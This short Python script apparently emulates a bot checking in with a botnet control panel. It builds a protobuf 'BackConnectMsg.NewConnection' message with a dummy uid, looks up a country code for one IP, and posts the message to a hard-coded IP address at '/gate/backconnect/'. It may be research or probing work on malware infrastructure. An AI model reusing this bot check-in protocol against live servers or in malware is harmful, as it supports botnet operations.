import struct

import requests
import requests
import bot_pb2
import json

session = bot_pb2.BackConnectMsg.NewConnection()

session.uid = '123456789'.encode('utf-16-le')
session.type = 1
session.port = 1

print(requests.get('http://api.sypexgeo.net/json/95.179.127.220').json()['country']['iso'].lower())

r = requests.post(url='http://185.250.151.137:80/gate/backconnect/', data=struct.pack('=I', 1) + session.SerializeToString())
print(r.text)